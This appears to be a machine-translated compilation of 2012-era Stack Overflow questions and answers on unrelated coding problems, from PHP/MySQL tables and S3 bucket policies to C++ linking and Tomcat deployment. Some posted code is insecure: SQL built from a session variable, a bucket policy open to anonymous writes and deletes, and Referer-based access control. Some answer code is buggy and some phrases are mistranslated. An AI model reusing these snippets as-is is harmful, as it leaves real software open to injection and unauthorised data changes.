如果您设置在此路径上，并且离线功能是一个明确的要求，那么我认为您唯一的选择是使用 Flash 的[LocalConnection](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/LocalConnection.html)功能，正如 Brad 在评论中所建议的那样。[我想你可以用ExternalInterface](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/external/ExternalInterface.html)创建一个桥来将任何数据从 Flash 传递到页面。Flash 只需要编组通信（它可以在页面的某处占据一个像素），不需要做任何其他事情。这与[dojotokit](http://dojotoolkit.org/)采用闪存存储的方法类似，旨在为 cookie 提供更强大的替代方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T20:39:23.650

*我认为*这里的答案是视图中发生的事情，不必揭示幕后发生的事情。

您可以使页面上的 DOM 元素与页面上的其他 DOM 元素进行通信，而无需对服务器进行异步调用（如果这就是您所要求的）。

如果您在.. 中有两个选项卡，比如说 chrome 浏览器，并且您希望一个 DOM 元素与另一个完全不同的浏览器选项卡上的 DOM 元素对话。您必须对服务器进行异步调用，这会将一个返回到另一个选项卡。但是您不必在视图中显示发生的情况 :)（这可以使用 Node.JS/Socket.io 来完成，例如使用 HTML5/JS 构建的聊天室）

希望这可以帮助

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-18T09:28:13.643

我知道这是一篇较旧的帖子，但您可能想查看本地存储，甚至是通过 javascript 设置的 cookie。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-09-06T20:12:33.483

有 2 种可靠的方法可以让其他选项卡（或跨 iframe）中的页面相互通信。

1.  [postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) API 允许页面发送消息，即使它们位于不同的域中。为了避免恶意行为，需要注意一些安全问题。您可以在链接的文章中阅读相关内容。
2.  [localStorage 和 sessionStorage](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)将在更改时发送一个[“存储”事件。](https://developer.mozilla.org/en-US/docs/Web/Events/storage)使用此事件，您可以在数据更改时在其他选项卡中收到通知。这仅适用于同一域。因为这就是您所需要的，所以避免任何安全问题可能是更明智的选择。

# c++ - C++ 头文件和类文件 - 未定义的引用

> ID：13093865
> 
> 赞同：0
> 
> 时间：2012-10-26T20:19:54.003
> 
> 标签：c++, qt, class, header

> **可能重复：**
> [什么是未定义的引用/未解决的外部符号错误，我该如何解决？](https://stackoverflow.com/questions/12573816/what-is-an-undefined-reference-unresolved-external-symbol-error-and-how-do-i-fix)

。H：

```
class ArithmeticCoding
{
public:
    ArithmeticCoding();
    static void test(QString text);

    static QMap<QChar,int> letters_freq;
} 
```

.cpp：

```
QMap<QChar, int> letters_freq;

ArithmeticCoding::ArithmeticCoding()
{
}

void ArithmeticCoding::test(QString text)
{
    for(int i=0; i<text.length(); i++) letters_freq[text.at(i)]++;
} 
```

我正进入（状态

> 算术编码.cpp:-1：错误：未定义对“ArithmeticCoding::letters_freq”的引用

为什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-26T20:20:35.723

将此添加到您的一个 CPP

```
 QMap<QChar,int> ArithmeticCoding::letters_freq; 
```

# java - GXT 3 ContentPanel 自动高度或 FillLayout

> ID：13093866
> 
> 赞同：1
> 
> 时间：2012-10-26T20:19:55.640
> 
> 标签：java, gwt, gxt

我无法让 ContentPanel 获取 BorderLayoutContainer 内的所有可用高度。

在 2.x 版本中，它和 一样简单，`setLayout(new FillLayout());`但对于 GXT 3.0.x 不再有效。

为了使我的问题更清楚，我从这里[GXT 3 demo](http://www.sencha.com/examples/)中获取了示例，这就是它的外观：![边框布局演示](../Images/b66dfe88488bb5678a56b75bcf734cc0.png) 但是当示例中的完全相同的代码复制到我的项目中时，它看起来像这样： ![同样的东西复制到我的项目中](../Images/8568c645dcef525842bd987d8bb9f5f5.png)

布局似乎被打破了。它在 Chrome 22.0.x 和 Firefox 16.0.1 中呈现相同的效果。我使用 GWT 2.4 和 GXT 3.0.1。我的 html 页面包含

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> 
```

和 `<link rel="stylesheet" type="text/css" href="modeluname/reset.css" />`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T23:33:19.733

Explorer 正在分配大小，这可能是一个错误，因为它使示例的可移植性降低。大小是从父级（带有 Demo 和 Source 的选项卡面板）分配的，而后者又从父级（主选项卡面板）获取大小，依此类推。为了解决这个问题，请确保设置一个大小。

通常，您不想在根小部件上设置大小 - 您只想使其始终适合浏览器中的可用空间。这意味着您要将所有内容添加到视口。[从http://www.sencha.com/examples/#ExamplePlace:borderlayout%28uibinder%29](http://www.sencha.com/examples/#ExamplePlace:borderlayout%28uibinder%29)的 onModuleLoad的源代码工作：

```
public void onModuleLoad() {
  Viewport viewport = new Viewport();
  viewport.setWidget(asWidget());
  RootPanel.get().add(viewport);
} 
```

就目前`FitLayout`而言，实际上没有必要 - 任何只接受一个孩子的容器在 GXT 3 中基本上已经有一个 FitLayout。2 中发生的主要问题与 3 中相同 - 一些父级没有传递大小到它的孩子 - 他们需要以同样的方式解决。

您也可以选择退出默认的类似 fitlayout 的行为 - 在任何 SimpleContainer（即 ContentPanel、FramedPanel 等）上调用 setResize(false)。不过，您通常希望将其打开，这是默认设置。

# java - 如何使用eclipse Juno将war文件部署到tomcat 6

> ID：13093868
> 
> 赞同：0
> 
> 时间：2012-10-26T20:20:01.047
> 
> 标签：java, javascript, eclipse, html, tomcat

我不熟悉在 Eclipse 上使用 javascript (HTML5) 和 Java 资源的构建过程。但最近我从某人那里得到了一个战争文件，他让我把它放在 tomcat 上（因为我用来访问该项目的服务器已关闭）。我试着把它放在 C:\Program Files\Apache Software Foundation\Tomcat 6.0\webapps... 然后我重新启动了我安装在 eclipse 上的 tomcat... 然后我想我将能够使用访问该项目本地主机

```
http://localhost:8080/<warprojectfilename> 
```

但是我得到404 ...

有人可以让我知道如何将它部署在 tomcat 上并像网站一样使用 localhost 访问它。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T21:09:21.193

看起来您的机器上正在运行其他 Tomcat（或使用端口 8080 的其他服务器）...请检查正在运行的 tomcat 实例并停止它，或停止您提到的任何其他运行正常的服务器运行服务。 .

您可以通过进入 tomcat/bin 并执行来停止 tomcat 服务器

```
 sh shutdown.sh 
```

或者

```
shutdown.bat 
```

在窗户里

并将war文件部署到Tomcat服务器：

1）去你的Tomcat路径

2) 打开 webapps 目录

3）在这里粘贴你的战争文件

4）重启tomcat

5) 现在你应该可以访问你的应用了

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-05-23T10:18:07.593

文件 -> 导入 ->Web-War 文件，这会将您的 .war 作为 Web 项目导入。转到服务器->tomcat->web 模块-> 添加导入的 web 项目。重启tomcat。你应该很好

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T21:59:26.297

因为它都是静态资源（javascript文件）......我决定在eclipse上的一个静态Web项目中提取整个东西并且它起作用了。

# z3 - Z3的datalog输入格式

> ID：13093869
> 
> 赞同：2
> 
> 时间：2012-10-26T20:20:29.753
> 
> 标签：z3

我正在寻找 fixpoint Z3 接受的数据记录输入格式的示例、规范或文档。我在源代码分发中寻找过它们，但没有找到。它们是否可以在线或在任何报告/论文中获得？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-27T00:23:24.520

我想您的问题是关于带有“.datalog”后缀的文件。在线教程说：“使用 BDDBDDB 格式解析后缀为 .datalog 的文件。该格式可用于与 BDDBDDB 工具进行基准比较。” 我相信应该有相当数量的 BDDBDDB 工具从该工具的分发页面接受的文件示例。我们的解析器可能有一些不兼容的地方，因为我不知道这种语言的规范。

您还可以输入 SMT2 格式的数据记录问题。SMT2 的扩展很少，我们在[http://research.microsoft.com/en-us/people/nbjorner/bmr-smt.pdf中对其进行了描述](http://research.microsoft.com/en-us/people/nbjorner/bmr-smt.pdf)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T21:39:43.407

The input format is described in the following online tutorials.

*   [http://rise4fun.com/Z3/tutorial/fixedpoints](http://rise4fun.com/Z3/tutorial/fixedpoints) (SMT 2.0 front-end)
*   [http://rise4fun.com/Z3Py/tutorial/fixedpoints](http://rise4fun.com/Z3Py/tutorial/fixedpoints) (Python front-end)

# c#-4.0 - 未找到 WebApi 区域

> ID：13093874
> 
> 赞同：0
> 
> 时间：2012-10-26T20:20:38.620
> 
> 标签：c#-4.0, asp.net-mvc-4, asp.net-web-api

我有一个 WebApi 项目，我正在尝试向它添加一个区域。

在将新区域添加到 webapi 项目与 mvc4 应用程序时，是否需要做一些不同的事情？

我有一个简单的区域注册，例如

```
 public class MobileAreaRegistration : AreaRegistration
{
    public override string AreaName
    {
        get
        {
            return "Mobile";
        }
    }

    public override void RegisterArea(AreaRegistrationContext context)
    {
        context.MapRoute(
            "Mobile_default",
            "Mobile/{controller}/{action}/{id}",
            new { action = "Index", id = UrlParameter.Optional }

        );
    }
} 
```

像这样的控制器

```
 public class BusinessDetailsController : BaseController
{
    public string Index()
    {
        return "hello world";
    }
    public HttpResponseMessage Get()
    {
        var data = new List<string> {"Store 1", "Store 2", "Store 3"};
        return Request.CreateResponse(HttpStatusCode.OK, data);
    }
} 
```

但是我永远无法访问 api。我是在做一些愚蠢的事情，还是需要做 webapi 的额外步骤？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-29T21:04:23.053

您的代码为 Area 注册了 MVC 路由，而不是 Web API 路由。

为此，请使用`MapHttpRoute`扩展方法（您需要添加 using 语句 for `System.Web.Http`）。

```
 public override void RegisterArea(AreaRegistrationContext context)
    {
        context.Routes.MapHttpRoute(
            name: "AdminApi",
            routeTemplate: "admin/api/{controller}/{id}",
            defaults: new { id = RouteParameter.Optional }
        );

        context.MapRoute(
            "Admin_default",
            "Admin/{controller}/{action}/{id}",
            new { action = "Index", id = UrlParameter.Optional }
        );
    } 
```

但是，ASP.NET Web API 中并不真正支持区域 OOTB，如果您有两个具有相同名称的控制器（无论它们是否位于不同的区域），您将获得异常。

要支持这种情况，您需要更改选择控制器的方式。[您将在此处](http://netmvc.blogspot.be/2012/06/aspnet-mvc-4-webapi-support-areas-in.html)找到一篇介绍如何执行此操作的文章。

# php - 我的代码有什么问题？我的目的是创建一个将行输入到 html 表中的表

> ID：13093885
> 
> 赞同：0
> 
> 时间：2012-10-26T20:21:30.030
> 
> 标签：php, mysql, foreach, html-table, row

我的代码有什么问题？我的目的是创建一个表格，将行输入到具有可变行数的 html 表格中。我的代码返回警告：

> 为 foreach() 提供的参数无效

```
<?php
{
$user=$_SESSION['username'];
$pass=$_SESSION['password'];
}
$con = mysql_connect("localhost","****","*****");
var_dump($con);

if (!$con)
  {
  die('Could not connect: ' . mysql_error());
  }

mysql_select_db("****", $con);
$result = mysql_query("select * from `order` WHERE username='$user'");

while ($row = mysql_fetch_array($result))
{
$html_table = '<table border="1 cellspacing="0" cellpadding="2""><th>Company     Symbol&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</th><th>Amount&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;    </th><th>Actual Stockprice&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</th><th>Old Stockprice&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</th><th>Cost&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</th><th>Profit/loss&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</th><tr>';
foreach($result as $row) {
  $html_table .= '<tr><td>' .$row['company']. '</td><td>' .$row['amount'].         '</td><td>' .$row['stock']. '</td></tr>';
}

$html_table .= '</tr></table>'; 

$html_table = str_replace('<tr></tr>', '', $html_table);

echo $html_table;        

 } 

?> 
```

任何帮助都会很棒。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T20:29:59.133

我认为这也可能是一个解决方案：

```
echo '<table border="1" cellspacing="0" cellpadding="2">';
echo '<th>Company Symbol</th><th>Amount</th><th>Actual Stockprice</th><th>Old Stockprice</th><th>Cost</th><th>Profit loss</th><tr>';
while ($row = mysql_fetch_array($result)) {
    echo '<tr>';
    foreach($row as $value) {
        echo "<td>$value</td>";
    }
    echo '</tr>';
}
echo '</table'>; 
```

另外，我会考虑使用 PDO 或 mysqli_，因为 mysql_ 已贬值且不安全。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T20:24:51.967

你的 foreach 循环坏了，应该是

```
foreach($row as $a_variable_name_that_is_not_result) {
  //stuff
} 
```

此外，如果您计划输出可变数量的*列*，则需要将`<tr>`标签移到`foreach`循环之外。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-10-26T20:26:55.910

试试这个

```
$html_table = '<table border="1" cellspacing="0" cellpadding="2"><th>Company     Symbol&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</th><th>Amount&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;    </th><th>Actual Stockprice&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</th><th>Old Stockprice&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</th><th>Cost&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</th><th>Profit/loss&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</th><tr>';
while ($row = mysql_fetch_array($result))
{
  $html_table .= '<tr><td>' .$row['company']. '</td><td>' .$row['amount'].         '</td><td>' .$row['stock']. '</td></tr>';
}

$html_table .= '</tr></table>'; 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-10-26T20:27:29.537

首先，$reuslt 是一个 PHP 资源，从

```
mysql_query("select * from `order` WHERE username='$user'"); 
```

[http://php.net/manual/en/function.mysql-query.php](http://php.net/manual/en/function.mysql-query.php)

您已经在此处引用了 $row

```
while ($row = mysql_fetch_array($result)) 
```

所以只需摆脱 foreach 循环。我完全看不出它的目的。

除此之外，肯定必须对最终标记的生成方式进行一些更改，因为它将“损坏”/无效

# node.js - 如何建立可重用的模块化 CoffeeScript 项目

> ID：13093886
> 
> 赞同：0
> 
> 时间：2012-10-26T20:21:35.017
> 
> 标签：node.js, coffeescript, requirejs, amd, javascript

我有[一个 CoffeeScript 项目（称为 jAddressParser）](https://github.com/brianmhunt/jAddressParser)，我希望将其变成可重用的模块。不幸的是，我不太熟悉如何为这样的目的模块化 CoffeeScript，同时保持与现有项目的合理互操作性。

有问题的[项目解析地址字符串](https://github.com/brianmhunt/jAddressParser)-可以肯定的是，[没有短顺序。](https://stackoverflow.com/questions/16413)但是，出于我正在从事的项目的目的，这种策略应该有效，并且其他人可能会从中受益，也许其他人可能会做出一些有用的贡献。每个人都赢了！

所以我所拥有的是在这样的目录中布局的代码：

```
/
  README.md
  LICENSE
  package.json
  /src
    main.js
    main.coffee
    canada.coffee
    iso3166.js
  /test
  /build 
```

在理想的世界中，我的工作流程是这样的：

1.  从命令行测试上面的 javascript。我认为[Node.js](http://nodejs.org/)是最合适的方式。

2.  将文件编译`/src`成一个`/build/jAddressParser.js`文件。我认为[r.js](https://github.com/jrburke/r.js/)会很好地解决这个问题。

3.  一切准备就绪后，将 复制`jAddressParser.js`到`/build`我的 Web 项目中。

4.  通过适当的调用将 jAddressParser 包含在我的 Web 项目中`requirejs`（即它可以支持 AMD），例如`require(['jAddressParser'], -> ...)`

由于似乎我必须包含依赖项（lodash、requirejs、require-cs、XRegExp、CoffeeScript），我希望我可以通过将特定版本放在`/lib`目录中或使用 git 子模块来做到这一点（尽管子模块似乎有点矫枉过正对于这么小的项目）。

我从未创建过可重用的 CoffeeScript 模块，而且我基本上无法找到关于如何为 web 模块执行相同操作的良好参考（对于仅限 node.js 的项目似乎有一些不错的示例 - 以为我肯定会很想看到更多的列表）。如果您有任何想法或参考资料可以阐明上述提案的可行性，或者您自己如何组织这样的项目，我将不胜感激？

# iphone - [[UILocalNotification alloc] init] 可以为零吗？

> ID：13093887
> 
> 赞同：1
> 
> 时间：2012-10-26T20:21:41.053
> 
> 标签：iphone, uilocalnotification

[本地和推送通知编程指南](http://developer.apple.com/library/ios/#documentation/NetworkingInternet/Conceptual/RemoteNotificationsPG/IPhoneOSClientImp/IPhoneOSClientImp.html#//apple_ref/doc/uid/TP40008194-CH103-SW1)使用以下代码：

```
//...etc..
 UILocalNotification *localNotif = [[UILocalNotification alloc] init];
    if (localNotif == nil)
        return;
//...etc.. 
```

我想知道 localNotif 为零的情况可能是什么？

否则，我看不出有那个 if 语句的意义。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-27T01:55:42.220

看起来它是针对失败的 alloc/init 的通用保护，就像标准的 -init 代码包含 nil 检查 ( `if (self == nil) { ... }`) 一样，即使在现代系统上分配失败的可能性极小。

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2012-10-26T20:32:24.337

尝试为您的应用禁用*所有*通知（包括声音/徽章）。

# java - 如何在 Java 中将数字从一个类转移到另一个类？

> ID：13093889
> 
> 赞同：-2
> 
> 时间：2012-10-26T20:21:46.663
> 
> 标签：java, numbers

我正在尝试使主函数中的用户输入数字出现在具有所有功能的第二类中。在第二堂课中，我试图让这个数字在整个班级的方法和函数中都可用

第一类：（主要类/功能）

```
 System.out.println("How long is your number?: ");       
    int numberLength = keyboard.nextInt(); 
```

第 2 类：

```
 private int[] lotteryNumbers = new int [3]; //3 is supposed to be numberLength 
```

关于如何做到这一点的任何建议？我有点失落。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T20:24:33.960

您可以在参数化构造函数中将值作为参数传递。请注意，在这种情况下，如果要使用 0-arg，则需要同时提供 0-arg 和参数化构造函数。

```
public class Class1 {
    public static void main(String[] args) {
        int numberLength = keyboard.nextInt();
        Class2 obj = new Class2(numberLength);

    }
}

class Class2 {
    private int[] lotteryNumbers;

    public Class2() { }
    public Class2(int length) {
       lotteryNumbers = new int [length];
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T20:23:29.263

假设您的其他类有一个参数类型为 int/long 的方法

您可以简单地实例化其他类并使用数字作为参数调用方法。

例子：

```
class B
{
public void otherClassMethod(int param)
{
//loigc
}
}

class Main
{
public static void main(String[] args)
{
B b = new B();
b.otherClassMethod(yourNumber);
}
} 
```

# android - Google Play 服务 - 清除允许的帐户

> ID：13093890
> 
> 赞同：3
> 
> 时间：2012-10-26T20:21:56.383
> 
> 标签：android, google-play-services

使用新的 Google Play 服务对帐户进行身份验证时，您首先使用 AccountPicker 允许用户选择一个帐户。如果用户之前没有通过您的应用程序进行身份验证，`UserRecoverableAuthException`则会抛出一个，让您有意显示“允许访问”页面。您只需要允许访问一次。但是，出于测试目的，我每次都需要查看“允许访问”页面。

那么，有谁知道如何清除 Google Play 服务的权限？或者其他一些每次都会显示允许访问页面的方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-28T18:06:15.107

在您的 Google 帐户设置中，有一种方法可以设置应用程序专用密码。注册两步验证，然后您可以创建它们。要暂时撤销权限，您可以删除或更改密码： http: [//support.google.com/accounts/bin/answer.py ?hl=en&answer=1070455](http://support.google.com/accounts/bin/answer.py?hl=en&answer=1070455)

否则，请暂时将密码更改为您的整个 Google 帐户。

不幸的是，我认为没有一种简单的编程方式可以做到这一点。用户/管理员无法撤销 Google 帐户对已安装应用程序的访问权限似乎是一个相当严重的安全漏洞。据我所知，Google 正在从服务器获取身份验证信息，如果该操作中的某些内容失败，它会抛出`UserRecoverableAuthException`. 那是您通常从 UserException.getIntent() 触发 Intent 的时候，它会通过以下请求联系服务器：

```
scope:oauth2:https://www.googleapis.com/auth/drive.readonly[
    account:<your_account>@gmail.com,
    scope:oauth2:https://www.googleapis.com/auth/drive.readonly,
    extrashash:<some_number>] 
```

现在，我没有找到指示服务器撤销上面请求的 Auth Scope 的文档。甚至可能都不可能。但是，您可以尝试捕获 UserException.getIntent() 返回的 Intent 中的值，并在用户希望使用其 Google 帐户登录时使用它来创建您启动的新 Intent。但是，服务器可能会意识到应用程序已经过身份验证，然后在没有提示的情况下发送给您。

# ruby-on-rails - AWS S3 存储桶策略 - 如何仅允许从我的网站访问？

> ID：13093902
> 
> 赞同：12
> 
> 时间：2012-10-26T20:22:29.800
> 
> 标签：ruby-on-rails, amazon-s3, paperclip

我有一个回形针文本文件附件（在 Rails 中）。

我的存储桶策略是：

```
{
    "Version": "2008-10-17",
    "Id": "Policy123",
    "Statement": [
        {
            "Sid": "Stmt123",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": [
                "s3:GetObjectVersion",
                "s3:DeleteObject",
                "s3:DeleteObjectVersion",
                "s3:GetObject",
                "s3:PutObject"
            ],
            "Resource": "arn:aws:s3:::my_bucket/*"
        }
    ]
} 
```

我想限制只有当请求来自我的网站时才允许访问这些操作。是否只是将其更新为： "Principal": {"AWS": "mywebsite.com"} 的情况？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-11-29T13:20:50.253

[您可以在S3 文档](http://docs.amazonwebservices.com/AmazonS3/latest/dev/AccessPolicyLanguage_UseCases_s3_a.html)中查看一些示例

要限制从您的网站访问，您可以使用**Referrer**上的条件：

```
{
  "Version":"2008-10-17",
  "Id":"http referer policy example",
  "Statement":[
    {
      "Sid":"Allow get requests referred by www.mysite.com and mysite.com",
      "Effect":"Allow",
      "Principal":"*",
      "Action":"s3:GetObject",
      "Resource":"arn:aws:s3:::example-bucket/*",
      "Condition":{
        "StringLike":{
          "aws:Referer":[
            " http://www.mysite.com/*",
            " http://mysite.com/*"
          ]
        }
      }
    }
  ]
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2019-07-21T17:00:59.887

桶策略：

```
{
    "Version": "2012-10-17",
    "Id": "http referer policy example",
    "Statement": [
        {
            "Sid": "Allow get requests originating from www.example.com and example.com.",
            "Effect": "Allow",
            "Principal": {
                "AWS": "arn:aws:iam::00000000:user/example-user" // IAM User ARN
            },
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::bucket-example/*", // bucket ARN
            "Condition": {
                "StringLike": {
                    "aws:Referer": [
                        "http://example.com/*" // Website link
                    ]
                }
            }
        }
    ]
} 
```

# encryption - 通过经典 ASP 函数执行用户定义函数

> ID：13093903
> 
> 赞同：1
> 
> 时间：2012-10-26T20:22:40.433
> 
> 标签：encryption, asp-classic, adodb, parameterized-query

好的，我正在尝试编写一个经典的 ASP 函数，它将调用一个 SQL 函数并返回输出。我正在尝试使用参数化的 ADODB 连接，但我不太清楚这些是如何工作的。努力学习正确的方法。

SQL 函数只接受两个字符串输入，其中一个是“盐”，另一个是实际文本并将其转换为十六进制。在 SQL 中运行良好，但我无法通过经典的 ASP 运行它。

我不断收到，ADODB.Command 错误“800a0cc1”

在与请求的名称或序号对应的集合中找不到项目。

```
Sub Encrypt(plainString)
    strSQL = "SET NOCOUNT ON;SELECT dbo.Encrypt('xx', '?') as keycode"
    Set cnnEncrypt = Server.CreateObject("ADODB.Connection")
    cnnEncrypt.open CONNSTRING

    Dim cmd1
    Set cmd1 = Server.CreateObject("ADODB.Command")
    cmd1.ActiveConnection = cnnEncrypt
    cmd1.CommandText = strSQL
    cmd1.CommandType = adCmdText
    cmd1.Parameters(0) = plainString      (**Original Error Occured Here!!!!**)
    Set rsEncrypt = cmd1.Execute()

    If not rsEncrypt.EOF Then
        Encrypt = rsEncrypt.Fields("keycode").Value
    Else
        Encrypt = "blank"
    End If

    ' Clean Up    
    rsEncrypt.Close    
    Set rsEncrypt = Nothing    
    cnnEncrypt.Close    
    Set cnnEncrypt = Nothing    

End Sub 
```

审查“Cheran Shunmugavel”答案后的新工作版本。像这样在现场打电话

< % Response.Write Decrypt(Encrypt("test")) % >

您无法将加密代码打印到页面上，因为它是二进制的。你需要一个 Binary to String 函数。我从 Sub 转换为 Function 因为我希望函数返回一个值。

```
Function Encrypt(byVal plainString)
    strSQL = "SET NOCOUNT ON;SELECT dbo.Encrypt('xx', ?) as keycode"
    Set cnnEncrypt = Server.CreateObject("ADODB.Connection")
    cnnEncrypt.open CONNSTRING

    Dim cmd1
    Set cmd1 = Server.CreateObject("ADODB.Command")
    cmd1.ActiveConnection = cnnEncrypt
    cmd1.CommandText = strSQL
    cmd1.CommandType = adCmdText
    cmd1.Parameters.Append cmd1.CreateParameter("", adVarChar, adParamInput, Len(plainString)+1, plainString)  
    Set rsEncrypt = cmd1.Execute()

    If not rsEncrypt.EOF Then
        Encrypt = rsEncrypt.Fields("keycode").Value
    Else
        Encrypt = "blank"
    End If

    ' Clean Up    
    rsEncrypt.Close    
    Set rsEncrypt = Nothing    
    cnnEncrypt.Close    
    Set cnnEncrypt = Nothing    
End Function 
```

这是解密功能。

```
Function Decrypt(byVal plainString)
    strSQL = "SET NOCOUNT ON;SELECT dbo.Decrypt('xx', ?) as keycode"
    Set cnnDecrypt = Server.CreateObject("ADODB.Connection")
    cnnDecrypt.open CONNSTRING

    Dim cmd1
    Set cmd1 = Server.CreateObject("ADODB.Command")
    cmd1.ActiveConnection = cnnDecrypt
    cmd1.CommandText = strSQL
    cmd1.CommandType = adCmdText
    cmd1.Parameters.Append cmd1.CreateParameter("", adVarBinary, adParamInput, LenB(plainString)+1, plainString)  
    Set rsDecrypt = cmd1.Execute()

    If not rsDecrypt.EOF Then
        Decrypt = rsDecrypt.Fields("keycode").Value
    Else
        Decrypt = "blank"
    End If

    ' Clean Up    
    rsDecrypt.Close    
    Set rsDecrypt = Nothing    
    cnnDecrypt.Close    
    Set cnnDecrypt = Nothing    
End Function 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-27T05:59:11.680

首先，您不需要在参数占位符周围使用分隔符。SQL Server 将适当地处理它。

```
strSQL = "SET NOCOUNT ON;SELECT dbo.Encrypt('xx', ?) as keycode" 
```

* * *

其次，该`Parameters`集合最初是空的，必须在您尝试访问它之前填充（即 line `cmd1.Parameters(0) = plainString`）。有几种方法可以做到这一点，但我更喜欢使用以下[`CreateParameter`](http://msdn.microsoft.com/en-us/library/windows/desktop/ms677209%28v=vs.85%29.aspx)方法手动创建参数：

```
cmd1.Parameters.Append cmd1.CreateParameter("", adVarChar, adParamInput, Len(plainString), plainString) 
```

* * *

此外，这在您的代码中并不明显，但请确保您已经定义了 ADO 常量，方法是[引用类型 library](http://msdn.microsoft.com/en-us/library/ms525307%28VS.90%29.aspx)或[包含 adovbs.inc](http://msdn.microsoft.com/en-us/library/windows/desktop/ms676526%28v=vs.85%29.aspx)。

# c - 当用户输入正整数而不是字符时打破循环

> ID：13093906
> 
> 赞同：1
> 
> 时间：2012-10-26T20:22:47.717
> 
> 标签：c, loops, if-statement

目前，我的程序中有一个循环，其格式如下：

```
 #include<stdio.h>

    int main()
    {
    int n;

         while(1)
         {
         printf("Enter a positive number, n");

         scanf("%d",&n);

         if(n>0)
             {
              break;
             }
          }
      } 
```

我使用 if(n>0) 语句的目的是当且仅当用户输入一个正整数时才退出循环。但是，如果用户键入字符“g”，例如，循环仍然会中断，因为 ASCII 值将被解释。如何形成这个循环，以便它在用户输入 n 的正整数值时中断？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-26T20:25:56.323

[检查scanf](http://linux.die.net/man/3/sscanf)的返回值，它返回读取的成功输入数：

```
int rc = scanf("%d",&n);

if (rc==1 && n>0) {
  ...
} 
```

* * *

我建议您使用[fgets](http://linux.die.net/man/3/fgets)将输入读入字符串并使用[strtol](http://linux.die.net/man/3/strtol)转换为整数，因为由于@paddy 所说的原因，scanf 是一个糟糕的选择。

# sql - 即使查询有效，SSRS 参数也不会显示

> ID：13093910
> 
> 赞同：1
> 
> 时间：2012-10-26T20:23:17.293
> 
> 标签：sql, sql-server, reporting-services

我有一个查询来填写报告参数：

```
select distinct [Source No_] from _report_sales_master
where [Industry] = @Industries
and [posting date] >= dateadd(year,datediff(year,'01/06/2000',@year)-1,'01/06/2000') 
and  [posting date] < dateadd(year,datediff(year,'01/06/2000',@year),'01/06/2000')
order by [Source No_] 
```

查询产生一个列表，我用它来填充多值报告参数。

当我运行查询时，它会生成正确的结果。

当我运行报告时，“Source No_”参数保持为空，无论我选择哪个@year 或@industries

当我从查询中删除“发布日期”子句时，参数列表会填充并正常工作。

我错过了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T02:25:27.143

尝试将硬编码的日期（字符串文字）以`'yyyy-mm-dd'`. 我发现当以您拥有的格式（即 dd/mm/yyyy 或 mm/dd/yyyy）输入日期时，SSRS 可以混淆哪个是月份，哪个是日期。

我已经在 db 和 SSRS 级别进行了各种设置以进行日期本地化，并发现您格式中的任何日期字符串都可能导致问题（我不知道具体原因）。

当您使用字符串文字时，会执行隐式转换以将其解析为以下之一： `time, date, smalldatetime, datetime, datetime2`或`datetimeoffset`值。

防止日期错误的另一种方法是用显式强制转换替换您的字符串文字，例如：

*   `CONVERT(datetime, '2012-06-01', 101)`假设月份 = 六月
*   `CONVERT(datetime, '2012-01-06', 101)`假设月份 = 一月

我能想到要检查的唯一另一件事是报告中的参数设置为列的正确数据类型`[Source No_]`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-30T14:07:53.353

把它放在你的数据库中并玩弄：

```
DECLARE @year DATETIME
SELECT @year = TypeDateTimeInputHere
SELECT dateadd(year,datediff(year,'01/06/2000',@year)-1,'01/06/2000') [GT posting date]
,dateadd(year,datediff(year,'01/06/2000',@year),'01/06/2000') [LT posting date] 
```

我不知道你试图用你的大于或等于（GT）和小于（LT）逻辑做什么，但我认为它没有达到你所期望或想要的效果。每次我测试它时，我都会得到相同的结果，除非我强制将 [发布日期] 设置为小于 2000 年 1 月 6 日的某个日期。

显然，将“TypeDateTimeInputHere”替换为您知道或预计会出现在 [发布日期] 中的示例值。

